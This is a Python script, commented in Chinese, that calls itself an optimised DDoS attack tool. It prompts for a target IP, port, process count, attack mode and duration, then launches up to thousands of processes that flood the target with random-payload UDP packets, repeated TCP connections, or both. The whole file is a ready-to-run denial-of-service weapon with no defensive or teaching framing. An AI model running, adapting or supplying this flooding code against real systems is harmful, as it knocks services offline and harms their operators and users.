# -*- coding: utf-8 -*-

import sys
import os
import time
import socket
import random
import multiprocessing
from multiprocessing import Process, Event
from typing import List
import ipaddress
import array

# 优化：使用更高效的随机数据生成
def generate_payload(size: int = None) -> bytes:
    if size is None:
        size = random.randint(1024, 65500)
    return array.array('B', [random.randint(0, 255) for _ in range(size)]).tobytes()

# 优化：预生成payload池
def create_payload_pool(count: int = 10) -> List[bytes]:
    return [generate_payload() for _ in range(count)]

# 优化：改进的socket池创建
def create_socket_pool(pool_size: int = 10) -> List[socket.socket]:
    sockets = []
    for _ in range(pool_size):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)  # 最大UDP缓冲区
        sockets.append(sock)
    return sockets

# 优化：改进的TCP SYN洪水
def tcp_syn_flood(target_ip: str, target_port: int, payload_pool: List[bytes], stop_event: multiprocessing.Event):
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((target_ip, target_port))
            s.send(random.choice(payload_pool))
            s.close()
        except:
            continue

# 优化：改进的UDP洪水
def udp_flood(target_ip: str, target_port: int, payload_pool: List[bytes], stop_event: multiprocessing.Event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(random.choice(payload_pool), (target_ip, target_port))
        except:
            continue
    sock.close()

def validate_input(ip: str, port: int, threads: int) -> bool:
    try:
        ipaddress.ip_address(ip)
        if not (0 <= port <= 65535):
            print("端口必须在 0-65535 之间")
            return False
        if not (1 <= threads <= 5000):
            print("线程数必须在 1-5000 之间")
            return False
        return True
    except ValueError:
        print("无效的 IP 地址")
        return False

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("增强版 DDos 攻击工具 (优化版)")
    print("-" * 50)
    
    target_ip = input("输入目标 IP: ")
    target_port = int(input("输入目标端口: "))
    process_count = int(input("输入进程数量 (建议 10-100): "))
    attack_mode = input("选择攻击模式 (1: UDP, 2: TCP, 3: 混合): ")
    duration = float(input("输入攻击持续时间（秒），输入0表示持续攻击直到手动停止: "))
    
    if not validate_input(target_ip, target_port, process_count):
        return

    print("\n初始化攻击...")
    payload_pool = create_payload_pool(20)
    stop_event = multiprocessing.Event()
    processes = []
    
    print(f"目标 IP: {target_ip}")
    print(f"目标端口: {target_port}")
    print(f"进程数量: {process_count}")
    print(f"攻击持续时间: {'无限制' if duration == 0 else f'{duration}秒'}")

    # 创建进程
    if attack_mode in ['1', '3']:
        udp_processes = process_count // 2 if attack_mode == '3' else process_count
        for _ in range(udp_processes):
            p = Process(target=udp_flood, args=(target_ip, target_port, payload_pool, stop_event))
            p.daemon = True  # 设置为守护进程
            processes.append(p)

    if attack_mode in ['2', '3']:
        tcp_processes = process_count // 2 if attack_mode == '3' else process_count
        for _ in range(tcp_processes):
            p = Process(target=tcp_syn_flood, args=(target_ip, target_port, payload_pool, stop_event))
            p.daemon = True  # 设置为守护进程
            processes.append(p)

    # 启动所有进程
    for p in processes:
        p.start()

    try:
        if duration > 0:
            time.sleep(duration)
            print(f"\n攻击已完成，持续时间: {duration}秒")
            # 强制终止所有进程
            for p in processes:
                p.terminate()
                p.join(timeout=1)
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n攻击已手动停止")
    finally:
        stop_event.set()
        # 确保所有进程都被终止
        for p in processes:
            try:
                p.terminate()
                p.join(timeout=1)
            except:
                pass
        print("所有攻击进程已终止")
        sys.exit(0)

if __name__ == "__main__":
    try:
        multiprocessing.freeze_support()  # Windows支持
        main()
    except KeyboardInterrupt:
        print("\n攻击已停止")
        sys.exit(0)
